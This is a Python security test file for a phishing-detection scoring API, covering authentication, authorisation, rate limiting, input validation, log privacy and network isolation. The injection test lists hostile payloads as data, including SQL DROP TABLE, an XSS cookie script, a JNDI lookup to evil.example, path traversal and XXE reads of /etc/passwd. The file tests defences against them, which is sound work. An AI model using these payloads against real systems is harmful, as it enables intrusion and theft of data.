"""Security tests: authentication, authorisation, abuse resistance and privacy.

Mapped to the OWASP API Security Top 10 items that apply to a scoring service.
The brief requires "at least one failure-mode, security or robustness
experiment"; these are the security half, and ``test_transforms.py`` plus the
robustness report are the other half.
"""

from __future__ import annotations

import logging

import numpy as np

from phishguard.service.security import (
    ApiKeyAuthenticator,
    AuthError,
    RateLimitError,
    TokenBucketLimiter,
    generate_api_key,
    hash_key,
)
from phishguard.service.telemetry import JsonFormatter, log_event
from tests.helpers import make_settings, scan_request, scan_service


# ------------------------------------------------- API2 authentication
def test_valid_key_authenticates_with_the_right_role():
    auth = ApiKeyAuthenticator({"secret-analyst": "analyst", "secret-admin": "admin"})
    assert auth.authenticate("secret-analyst").role == "analyst"
    assert auth.authenticate("secret-admin").role == "admin"


def test_missing_and_wrong_keys_are_rejected():
    auth = ApiKeyAuthenticator({"secret": "analyst"})
    for bad in (None, "", "   ", "wrong", "secre", "secrett", "SECRET"):
        try:
            auth.authenticate(bad)
        except AuthError as exc:
            assert exc.status == 401
        else:  # pragma: no cover
            raise AssertionError(f"key {bad!r} should not authenticate")


def test_only_digests_are_retained_never_the_key():
    auth = ApiKeyAuthenticator({"super-secret-value": "admin"})
    blob = repr(auth.__dict__)
    assert "super-secret-value" not in blob
    assert hash_key("super-secret-value") in blob


def test_key_id_does_not_reveal_the_key():
    auth = ApiKeyAuthenticator({"super-secret-value": "admin"})
    key_id = auth.authenticate("super-secret-value").key_id
    assert "super-secret-value" not in key_id
    assert key_id.startswith("key_")


# ------------------------------------------ API5 function-level authorisation
def test_analyst_cannot_reach_admin_functions():
    auth = ApiKeyAuthenticator({"a": "analyst", "b": "admin"})
    try:
        auth.require("a", "admin")
    except AuthError as exc:
        assert exc.status == 403
        assert exc.reason == "forbidden"
    else:  # pragma: no cover
        raise AssertionError("an analyst key must not satisfy the admin requirement")


def test_admin_inherits_analyst_permissions():
    auth = ApiKeyAuthenticator({"b": "admin"})
    assert auth.require("b", "analyst").role == "admin"


def test_unknown_roles_are_ignored_at_configuration_time():
    auth = ApiKeyAuthenticator({"k": "superuser"})
    assert not auth.configured


def test_production_refuses_to_start_without_configured_keys():
    from phishguard.service.security import build_security

    settings = make_settings(environment="prod", api_keys="")
    try:
        build_security(settings)
    except RuntimeError as exc:
        assert "PG_API_KEYS" in str(exc)
    else:  # pragma: no cover
        raise AssertionError("production must not fall back to development keys")


def test_development_keys_are_flagged_loudly():
    from phishguard.service.security import build_security

    security = build_security(make_settings(environment="dev", api_keys=""))
    assert security.using_development_keys
    assert security.warnings


def test_generated_keys_are_long_and_unique():
    keys = {generate_api_key("analyst") for _ in range(50)}
    assert len(keys) == 50
    assert all(len(k) > 32 for k in keys)


# ---------------------------------------- API4 resource consumption
def test_rate_limiter_allows_a_burst_then_throttles():
    limiter = TokenBucketLimiter(rate_per_minute=60, burst=5)
    for _ in range(5):
        limiter.check("caller")
    try:
        limiter.check("caller")
    except RateLimitError as exc:
        assert exc.retry_after > 0
    else:  # pragma: no cover
        raise AssertionError("the limiter should have thrown on the sixth call")


def test_rate_limiter_refills_over_time():
    limiter = TokenBucketLimiter(rate_per_minute=60, burst=2)
    limiter.check("caller", now=0.0)
    limiter.check("caller", now=0.0)
    try:
        limiter.check("caller", now=0.0)
    except RateLimitError:
        pass
    limiter.check("caller", now=2.0)  # one token per second


def test_rate_limits_are_per_caller():
    limiter = TokenBucketLimiter(rate_per_minute=60, burst=1)
    limiter.check("caller-a")
    limiter.check("caller-b")  # a separate bucket


def test_oversized_input_is_rejected_by_the_contract():
    from pydantic import ValidationError

    from phishguard.service.contracts import MAX_BODY, ScanRequest

    try:
        ScanRequest(body="x" * (MAX_BODY + 1))
    except ValidationError:
        pass
    else:  # pragma: no cover
        raise AssertionError("an oversized body must be rejected before the model")


def test_batch_size_is_bounded():
    from pydantic import ValidationError

    from phishguard.service.contracts import BatchScanRequest

    try:
        BatchScanRequest(messages=[scan_request() for _ in range(101)])
    except ValidationError:
        pass
    else:  # pragma: no cover
        raise AssertionError("batch size must be capped")


def test_unknown_fields_are_rejected():
    from pydantic import ValidationError

    from phishguard.service.contracts import ScanRequest

    try:
        ScanRequest(subject="hi", unexpected_field="surprise")
    except ValidationError:
        pass
    else:  # pragma: no cover
        raise AssertionError("extra fields must be forbidden")


# ------------------------------------------------- injection resistance
def test_hostile_payloads_do_not_crash_the_scanner():
    """The scan endpoint is reachable by anything that reaches the gateway."""
    service, _, _ = scan_service()
    payloads = [
        "'; DROP TABLE decisions; --",
        "<script>alert(document.cookie)</script>",
        "{{7*7}} ${jndi:ldap://evil.example/a}",
        "../../../../etc/passwd",
        "\x00\x01\x02 null bytes",
        "😀" * 500,
        "%s%s%s%n",
        "‮exe.txt",
        "\\u202Egnp.exe",
        "<?xml version='1.0'?><!DOCTYPE x [<!ENTITY e SYSTEM 'file:///etc/passwd'>]>",
    ]
    for payload in payloads:
        response = service.scan(scan_request(subject=payload, body=payload))
        assert 0.0 <= response.score <= 1.0

    # A body at the size limit must still be scored rather than crashing; a
    # body beyond it is rejected by validation, which the contract test covers.
    big = service.scan(scan_request(subject="large", body="A" * 100_000))
    assert 0.0 <= big.score <= 1.0


def test_sql_injection_through_a_filter_does_not_affect_the_store():
    service, store, _ = scan_service()
    service.scan(scan_request())
    before = store.count()
    page = service.list_decisions(sender_domain="'; DROP TABLE decisions; --")
    assert page.items == []
    assert store.count() == before


def test_a_decision_id_is_unguessable():
    service, _, _ = scan_service()
    ids = {service.scan(scan_request()).decision_id for _ in range(5)}
    assert len(ids) == 5
    assert all(len(i) >= 20 for i in ids)


# ------------------------------------------------------------- privacy
def test_logs_never_carry_message_content():
    records: list[logging.LogRecord] = []

    class _Capture(logging.Handler):
        def emit(self, record: logging.LogRecord) -> None:
            records.append(record)

    logger = logging.getLogger("phishguard.test.privacy")
    logger.handlers = [_Capture()]
    logger.setLevel(logging.INFO)
    log_event(
        logger, logging.INFO, "scan",
        request_id="req_1", score=0.9,
        body="the secret merger price is 41.5 million",
        subject="CONFIDENTIAL", sender="victim@corp.example",
        sender_domain="corp.example",
    )
    formatted = JsonFormatter().format(records[0])
    assert "41.5 million" not in formatted
    assert "CONFIDENTIAL" not in formatted
    assert "victim@corp.example" not in formatted
    assert "corp.example" in formatted  # the domain is retained for investigation


def test_pseudonymisation_is_stable_and_not_reversible():
    from phishguard.schemas import pseudonymize

    a = pseudonymize("victim@corp.example", "salt-1")
    b = pseudonymize("victim@corp.example", "salt-1")
    c = pseudonymize("victim@corp.example", "salt-2")
    assert a == b
    assert a != c
    assert "victim" not in a and "corp.example" not in a


def test_redaction_projection_drops_content():
    from tests.helpers import phishing_message

    redacted = phishing_message().redacted("salt")
    blob = " ".join(str(v) for v in redacted.values())
    assert "Dear Customer" not in blob
    assert "security@paypa1-secure-verify.tk" not in blob
    assert redacted["sender_domain"] == "paypa1-secure-verify.tk"


# --------------------------------------------------- model-level abuse
def test_the_model_never_fetches_anything_from_the_network():
    """URL resolution would be an SSRF primitive and would leak victim telemetry."""
    import socket

    from tests.helpers import trained_detector

    detector, _ = trained_detector()
    original = socket.socket

    class _Blocked(socket.socket):
        def __init__(self, *a, **k):  # pragma: no cover - must never run
            raise AssertionError("the detector attempted a network connection")

    socket.socket = _Blocked  # type: ignore[misc]
    try:
        verdict = detector.assess(
            scan_request(
                body="Click http://internal-metadata.example/latest/meta-data/ now to verify"
            ).to_message()
        )
        assert 0.0 <= verdict.score <= 1.0
    finally:
        socket.socket = original  # type: ignore[misc]


def test_scores_stay_bounded_under_adversarial_input():
    from phishguard.adversarial.transforms import random_perturbation
    from tests.helpers import phishing_message, trained_detector

    detector, _ = trained_detector()
    rng = np.random.default_rng(0)
    for _ in range(10):
        attacked = random_perturbation(phishing_message(), rng)
        score = detector.assess(attacked, explain=False).score
        assert 0.0 <= score <= 1.0
